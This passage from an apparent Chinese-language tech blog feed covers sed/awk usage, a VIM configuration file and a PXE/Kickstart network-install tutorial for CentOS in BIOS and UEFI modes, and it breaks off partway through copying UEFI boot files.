file.txt</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x63D2;&#x5165;&#x5185;&#x5BB9;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> $&#x8868;&#x793A;&#x6700;&#x540E;&#x4E00;&#x884C;</span></span><br><span class="line">sed -i &apos;$a hello&apos; sample.txt</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x5217;&#x64CD;&#x4F5C;-1"><a href="#&#x5217;&#x64CD;&#x4F5C;-1" class="headerlink" title="&#x5217;&#x64CD;&#x4F5C;"></a>&#x5217;&#x64CD;&#x4F5C;</h3><h3 id="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;-1"><a href="#&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;-1" class="headerlink" title="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;"></a>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;</h3><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><h3 id="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;-2"><a href="#&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;-2" class="headerlink" title="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;"></a>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;</h3><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;awk&quot;&gt;&lt;a href=&quot;#awk&quot; class=&quot;headerlink&quot; title=&quot;awk&quot;&gt;&lt;/a&gt;awk&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;line1 f2 f3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;line2 f4 f5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;line3 f6 f7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo -e &quot;line1 f2 f3\nline2 f4 f5\nline3 f6 f7&quot; | awk &#39;&amp;#123;print &quot;Line No:&quot;NR&quot;, No of fields:&quot;NF, &quot;$0=&quot;$0, &quot;$1=&quot;$1, &quot;$2=&quot;$2, &quot;$3=&quot;$3&amp;#125;&#39; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Line No:1, No of fields:3 $0=line1 f2 f3 $1=line1 $2=f2 $3=f3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Line No:2, No of fields:3 $0=line2 f4 f5 $1=line2 $2=f4 $3=f5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Line No:3, No of fields:3 $0=line3 f6 f7 $1=line3 $2=f6 $3=f7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VIM的使用</title>
    <link href="https://marnm.github.io//posts/b382711f/"/>
    <id>https://marnm.github.io//posts/b382711f/</id>
    <published>2022-06-07T04:38:35.000Z</published>
    <updated>2022-06-07T05:22:22.484Z</updated>
    
    <content type="html"><![CDATA[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205111548935.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p><strong>VIM&#x57FA;&#x672C;&#x914D;&#x7F6E;</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&quot; &#x8BBE;&#x5B9A;&#x9ED8;&#x8BA4;&#x89E3;&#x7801;&#xA0;</span><br><span class="line">set fenc=utf-8</span><br><span class="line">set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936</span><br><span class="line"></span><br><span class="line">&quot; &#x4FA6;&#x6D4B;&#x6587;&#x4EF6;&#x7C7B;&#x578B;</span><br><span class="line">filetype on&#xA0;</span><br><span class="line">&quot; &#x8F7D;&#x5165;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x63D2;&#x4EF6;&#xA0;</span><br><span class="line">filetype plugin on&#xA0;&#xA0;</span><br><span class="line"></span><br><span class="line">&quot; &#x8BED;&#x6CD5;&#x9AD8;&#x4EAE;&#xA0;</span><br><span class="line">syntax enable</span><br><span class="line">syntax on&#xA0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot; &#x4E0D;&#x8981;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#xFF08;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x9700;&#x8981;&#x53D6;&#x820D;&#xFF09;&#xA0;</span><br><span class="line">set nobackup&#xA0;</span><br><span class="line"></span><br><span class="line">&quot; &#x4E0D;&#x8981;&#x751F;&#x6210;swap&#x6587;&#x4EF6;&#xFF0C;&#x5F53;buffer&#x88AB;&#x4E22;&#x5F03;&#x7684;&#x65F6;&#x5019;&#x9690;&#x85CF;&#x5B83;&#xA0;</span><br><span class="line">setlocal noswapfile&#xA0;</span><br><span class="line">set bufhidden=hide&#xA0;</span><br><span class="line"></span><br><span class="line">&quot; &#x4F7F;&#x56DE;&#x683C;&#x952E;&#xFF08;backspace&#xFF09;&#x6B63;&#x5E38;&#x5904;&#x7406;indent, eol, start&#x7B49;&#xA0;</span><br><span class="line">set backspace=2&#xA0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot; &#x7EE7;&#x627F;&#x524D;&#x4E00;&#x884C;&#x7684;&#x7F29;&#x8FDB;&#x65B9;&#x5F0F;&#xFF0C;&#x7279;&#x522B;&#x9002;&#x7528;&#x4E8E;&#x591A;&#x884C;&#x6CE8;&#x91CA;&#xA0;</span><br><span class="line">set autoindent&#xA0;</span><br><span class="line">&quot; &#x4E3A;C&#x7A0B;&#x5E8F;&#x63D0;&#x4F9B;&#x81EA;&#x52A8;&#x7F29;&#x8FDB;&#xA0;</span><br><span class="line">set smartindent&#xA0;</span><br><span class="line">&quot;&#x4F7F;&#x7528;C&#x6837;&#x5F0F;&#x7684;&#x7F29;&#x8FDB;&#xA0;</span><br><span class="line">set cindent&#xA0;</span><br><span class="line"></span><br><span class="line">&quot; &#x5236;&#x8868;&#x7B26;&#x4E3A;4&#xA0;</span><br><span class="line">set tabstop=4&#xA0;</span><br><span class="line">&quot; &#x7EDF;&#x4E00;&#x7F29;&#x8FDB;&#x4E3A;4&#xA0;</span><br><span class="line">set softtabstop=4&#xA0;</span><br><span class="line">set shiftwidth=4&#xA0;</span><br><span class="line"></span><br><span class="line">set cindent &quot;c/c++&#x81EA;&#x52A8;&#x7F29;&#x8FDB;&quot;</span><br><span class="line">set smartindent</span><br><span class="line">set autoindent&quot;&#x53C2;&#x8003;&#x4E0A;&#x4E00;&#x884C;&#x7684;&#x7F29;&#x8FDB;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x81EA;&#x52A8;&#x7F29;&#x8FDB;&quot;</span><br><span class="line">filetype indent on &quot;&#x6839;&#x636E;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x8FDB;&#x884C;&#x7F29;&#x8FDB;&quot;</span><br><span class="line">set softtabstop=4 &quot;4 character as a tab&quot;</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set smarttab</span><br></pre></td></tr></tbody></table></figure><p><strong>VIM&#x9ED8;&#x8BA4;&#x4E3B;&#x9898;&#x63A8;&#x8350;</strong></p><ul><li>darkblue</li><li>delek</li></ul><p><strong>&#x4EE5;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x67E5;&#x770B;&#x6587;&#x4EF6;</strong></p><pre><code>%!xxd</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
                   
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PXE自动化部署</title>
    <link href="https://marnm.github.io//posts/97717e94/"/>
    <id>https://marnm.github.io//posts/97717e94/</id>
    <published>2022-06-07T04:37:37.000Z</published>
    <updated>2022-06-07T05:22:42.827Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="PXE-Kickstart"><a href="#PXE-Kickstart" class="headerlink" title="PXE/Kickstart"></a>PXE/Kickstart</h3><h4 id="BIOS&#x6A21;&#x5F0F;"><a href="#BIOS&#x6A21;&#x5F0F;" class="headerlink" title="BIOS&#x6A21;&#x5F0F;"></a>BIOS&#x6A21;&#x5F0F;</h4><p>&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x5668;&#xFF08;NFS&#xFF0C;HTTPS&#xFF0C;HTTP&#xFF0C;FTP&#xFF09;&#x7528;&#x4E8E;&#x5B58;&#x50A8;ISO&#x955C;&#x50CF;<br><strong>&#x914D;&#x7F6E;DHCP</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install -y dhcp</span><br><span class="line">cp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf</span><br><span class="line">vim /etc/dhcp/dhcpd.conf</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">allow booting;</span><br><span class="line">allow bootp;</span><br><span class="line">ddns-update-style interim;</span><br><span class="line">ignore client-updates;</span><br><span class="line">subnet 192.168.10.0 netmask 255.255.255.0 {</span><br><span class="line">    option subnet-mask 255.255.255.0;</span><br><span class="line">    option domain-name-servers 192.168.10.10;</span><br><span class="line">    range dynamic-bootp 192.168.10.100 192.168.10.200;</span><br><span class="line">    default-lease-time 21600;</span><br><span class="line">    max-lease-time 43200;</span><br><span class="line">    next-server 192.168.10.10;</span><br><span class="line">    filename <span class="string">&quot;pxelinux.0&quot;</span>;</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart dhcpd &amp;&amp; systemctl <span class="built_in">enable</span> dhcpd</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x914D;&#x7F6E;tftp &#x63D0;&#x4F9B;&#x5F15;&#x5BFC;&#x6587;&#x4EF6;</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yum install -y tftp-server xinetd</span><br><span class="line">vim /etc/xinet.d/tftp</span><br><span class="line"></span><br><span class="line">service tftp {</span><br><span class="line">    socket_type = dgram</span><br><span class="line">    protocol = udp</span><br><span class="line">    <span class="built_in">wait</span> = yes</span><br><span class="line">    user = root</span><br><span class="line">    server = /usr/sbin/in.tftpd</span><br><span class="line">    server_args = -s /var/lib/tftpboot</span><br><span class="line">    <span class="built_in">disable</span> = no</span><br><span class="line">    per_source = 11</span><br><span class="line">    cps = 100 2</span><br><span class="line">    flags = IPv4</span><br><span class="line"> </span><br><span class="line">systemctl restart xinetd &amp;&amp; systemctl <span class="built_in">enable</span> xinetd</span><br><span class="line">firewall-cmd --permanent --add-port=69/udp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></tbody></table></figure><p>&#x83B7;&#x53D6;pxelinux.0&#x6587;&#x4EF6;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x5B89;&#x88C5;syslinux&#x5305;</span></span><br><span class="line">yum install -y syslinux</span><br><span class="line">cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/</span><br><span class="line"><span class="comment"># &#x6216;</span></span><br><span class="line"><span class="comment"># &#x76F4;&#x63A5;&#x52A0;&#x538B;rpm&#x5305;</span></span><br><span class="line">mount -t iso9660 /dev/cdrom /media/cdrom -o loop,ro</span><br><span class="line">cp -pr /media/cdrom/Packages/syslinux-x.xx-xx.x86_64.rpm ./</span><br><span class="line">rpm2cpio syslinux-x.xx-xx.x86_64.rpm | cpio -dimv</span><br><span class="line"><span class="comment"># &#x590D;&#x5236;pxelinux.0&#x5230;/var/lib/tftpboot/pxelinux/&#x4E2D; </span></span><br><span class="line">cp pxelinux.0 /var/lib/tftpboot/</span><br></pre></td></tr></tbody></table></figure><p>&#x590D;&#x5236;&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x5230;tftp&#x6839;&#x76EE;&#x5F55;&#x4E2D;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /media/cdrom/images/pxeboot/{vmlinuz,initrd.img} /var/lib/tftpboot/</span><br><span class="line">cp /media/cdrom/isolinux/{vesamenu.c32,boot.msg} /var/lib/tftpboot/</span><br></pre></td></tr></tbody></table></figure><p>&#x5F15;&#x5BFC;&#x83DC;&#x5355;default&#x6587;&#x4EF6;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x521B;&#x5EFA;&#x76EE;&#x5F55;</span></span><br><span class="line">mkdir /var/lib/tftpboot/pxelinux.cfg</span><br><span class="line"><span class="comment"># &#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">vim /var/lib/tftpboot/pxelinux.cfg/default</span><br><span class="line"><span class="comment"># &#x6216;</span></span><br><span class="line">cp /media/cdrom/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x914D;&#x7F6E;FTP</strong><br>&#x590D;&#x5236;&#x955C;&#x50CF;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x5230;ftp&#x76EE;&#x5F55;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum install -y vsftpd</span><br><span class="line">cp -pvr /media/cdrom/* /var/ftp/pub/</span><br><span class="line"></span><br><span class="line">firewall-cmd --permanent --add-service=ftp</span><br><span class="line">firewall-cmd --reload</span><br><span class="line">setsebool -P ftpd_connect_all_unreserved=on</span><br><span class="line"></span><br><span class="line">systemctl restart vsftpd &amp;&amp; systemctl <span class="built_in">enable</span> vsftpd</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x521B;&#x5EFA;kickstart&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong><br>&#x751F;&#x6210;kickstart&#x6587;&#x4EF6;<br><a href="https://access.redhat.com/labs/kickstartconfig/" target="_blank" rel="noopener">&#x4F7F;&#x7528;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5668;&#xFF08;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x767B;&#x5F55;&#xFF09;</a><br>&#x751F;&#x6210;&#x540E;&#x4E0B;&#x8F7D;&#x547D;&#x540D;&#x5B58;&#x653E;&#x5230;/var/ftp/pub/ks.cfg<br>&#x6216;<br>&#x4F7F;&#x7528;&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x677F;anaconda-ks.cfg</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /root/anaconda-ks.cfg /var/ftp/pub/ks.cfg</span><br><span class="line">chmod +r /var/ftp/pub/ks.cfg</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">---------------------dhcpd.confg--------------------------</span><br><span class="line"> allow booting;</span><br><span class="line"> allow bootp;</span><br><span class="line"> ddns-update-style interim;</span><br><span class="line"> ignore client-updates;</span><br><span class="line"> subnet 192.168.10.0 netmask 255.255.255.0 {</span><br><span class="line">     option subnet-mask 255.255.255.0;</span><br><span class="line">     option domain-name-servers 192.168.10.10;</span><br><span class="line">     range dynamic-bootp 192.168.10.100 192.168.10.200;</span><br><span class="line">     default-lease-time 21600;</span><br><span class="line">     max-lease-time 43200;</span><br><span class="line">     next-server 192.168.10.10;</span><br><span class="line">     filename &quot;pxelinux.0&quot;;</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---------------------tftp-----------------------</span><br><span class="line">disable = no</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---------------------default--------------------</span><br><span class="line">default linux</span><br><span class="line">...</span><br><span class="line"># 64 line &#x5730;&#x5740;&#x8981;&#x51C6;&#x786E;&#xFF0C;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#x5C31;&#x586B;&#x5230;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x9664;&#x975E;ftp&#x8BBE;&#x7F6E;&#x4E86;&#x9ED8;&#x8BA4;&#x76EE;&#x5F55;</span><br><span class="line">append initrd=initrd.img inst.stage2=ftp://192.168.128.120/pub ks=ftp://192.168.128.120/pub/ks.cfg quiet</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">---------------------ks.cfg---------------------</span><br><span class="line"># &#x7CFB;&#x7EDF;&#x8BA4;&#x8BC1;&#x8BBE;&#x7F6E;</span><br><span class="line">auth --enableshadown --passalgo=sha512</span><br><span class="line"># &#x6587;&#x4EF6;&#x670D;&#x52A1;&#x5730;&#x5740;</span><br><span class="line"></span><br><span class="line"># &#x5730;&#x5740;&#x8981;&#x51C6;&#x786E;&#xFF0C;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;&#x5C31;&#x586B;&#x5230;&#x54EA;&#x4E2A;&#x76EE;&#x5F55;</span><br><span class="line">url --url=ftp://192.168.128.120/pub</span><br><span class="line">firstboot --enable</span><br><span class="line">ignoredisk --only-use=sda</span><br><span class="line">keyboard --vckeymap=us --xlayouts=&apos;us&apos;</span><br><span class="line">lang en_US.UTF-8</span><br><span class="line">network --bootproto=dhcp --device=eno16777728 --onboot=off --ipv6=auto</span><br><span class="line">network --hostname=localhost.localdomain</span><br><span class="line">rootpw --iscrypted $6$pDjJf42g8C6pL069$iI.PX/yFaqpo0ENw2pa7MomkjLyoae2zjMz2UZJ7b H3UO4oWtR1.Wk/hxZ3XIGmzGJPcs/MgpYssoi8hPCt8b/</span><br><span class="line"># &#x65F6;&#x533A;&#x8BBE;&#x7F6E;</span><br><span class="line">timezone Asia/Shanghai --isUtc</span><br><span class="line"># &#x5206;&#x533A;&#x65B9;&#x5F0F;</span><br><span class="line">clearpart --all --initlabel</span><br><span class="line"># &#x5B89;&#x88C5;rpm&#x5305;</span><br><span class="line"> 31 %packages</span><br><span class="line"> 32 @base</span><br><span class="line"> 33 @core</span><br><span class="line"> 34 @desktop-debugging</span><br><span class="line"> 35 @dial-up</span><br><span class="line"> 36 @fonts</span><br><span class="line"> 37 @gnome-desktop</span><br><span class="line"> 38 @guest-agents</span><br><span class="line"> 39 @guest-desktop-agents</span><br><span class="line"> 40 @input-methods</span><br><span class="line"> 41 @internet-browser</span><br><span class="line"> 42 @multimedia</span><br><span class="line"> 43 @print-client</span><br><span class="line"> 44 @x11</span><br><span class="line"> 45 </span><br><span class="line"> 46 %end</span><br></pre></td></tr></tbody></table></figure><p>&#x68C0;&#x67E5;&#x670D;&#x52A1;&#x662F;&#x5426;&#x542F;&#x52A8;<br>systemctl status xinetd dhcpd</p><h4 id="UEFI&#x6A21;&#x5F0F;"><a href="#UEFI&#x6A21;&#x5F0F;" class="headerlink" title="UEFI&#x6A21;&#x5F0F;"></a>UEFI&#x6A21;&#x5F0F;</h4><p>&#x5728;BOIS&#x6A21;&#x5F0F;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x66F4;&#x65B0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;&#xFF1A;</p><p>&#x66F4;&#x65B0;DHCP&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x53C2;&#x8003;&#x6A21;&#x677F;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># DHCP Server Configuration file.</span></span><br><span class="line"><span class="comment">#   see /usr/share/doc/dhcp*/dhcpd.conf.example</span></span><br><span class="line"><span class="comment">#   see dhcpd.conf(5) man page</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">allow booting;</span><br><span class="line">allow bootp;</span><br><span class="line">ddns-update-style interim;</span><br><span class="line">ignore client-updates;</span><br><span class="line">option rfc3442-classless-static-routes code 121 = array of <span class="built_in">integer</span> 8;</span><br><span class="line">option ms-classless-static-routes code 249 = array of <span class="built_in">integer</span> 8;</span><br><span class="line">option space pxelinux;</span><br><span class="line">option pxelinux.magic code 208 = string;</span><br><span class="line">option pxelinux.configfile code 209 = text;</span><br><span class="line">option pxelinux.pathprefix code 210 = text;</span><br><span class="line">option pxelinux.reboottime code 211 = unsigned <span class="built_in">integer</span> 32;</span><br><span class="line">option architecture-type code 93 = unsigned <span class="built_in">integer</span> 16;</span><br><span class="line">subnet 192.168.128.0 netmask 255.255.255.0 {</span><br><span class="line">    option subnet-mask 255.255.255.0;</span><br><span class="line">    option domain-name-servers 192.168.128.120;</span><br><span class="line">    range dynamic-bootp 192.168.128.128 192.168.128.200;</span><br><span class="line">    default-lease-time 21600;</span><br><span class="line">    max-lease-time 43200;</span><br><span class="line"></span><br><span class="line">    class <span class="string">&quot;pxeclients&quot;</span>{</span><br><span class="line">        match <span class="keyword">if</span> substring(option vendor-class-identifier, 0, 9)=<span class="string">&quot;PXEClient&quot;</span>;</span><br><span class="line">        next-server 192.168.128.120;</span><br><span class="line">        <span class="keyword">if</span> option architecture-type = 00:07 {</span><br><span class="line">            filename <span class="string">&quot;shim.efi&quot;</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            filename <span class="string">&quot;pxelinux.0&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>&#x590D;&#x5236;uefi&#x5F15;&#x5BFC;&#x6587;&#x4EF6;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cp -pr /media/cdrom/Packages/shim-0.9-2.el7.x86_64.rpm </span><br><span class="line">cp -pr /media/cdrom/Packages/grub2-efi-2.02-0.44.el7.x86_64.rpm</span><br><span class="line">rpm2cpio shim-0.9-2.el7.x86_64.rpm | cpio -dimv</span><br><span class="line">rpm2cpio grub2-efi-2.02-0.44.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x590D;&#x5236;&#x76F8;&#x5173;&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x5230;tftpboot/&#x76EE;&#x5F55;&#x4E0B;</span></span><br><span class="line">cp ./bootloaders/boot/efi/EFI/redhat/shim.efi /var/lib/tftpboot/</span><br><span class="line">cp ./bootloaders/boot/efi/EFI/redhat/grubx64.efi 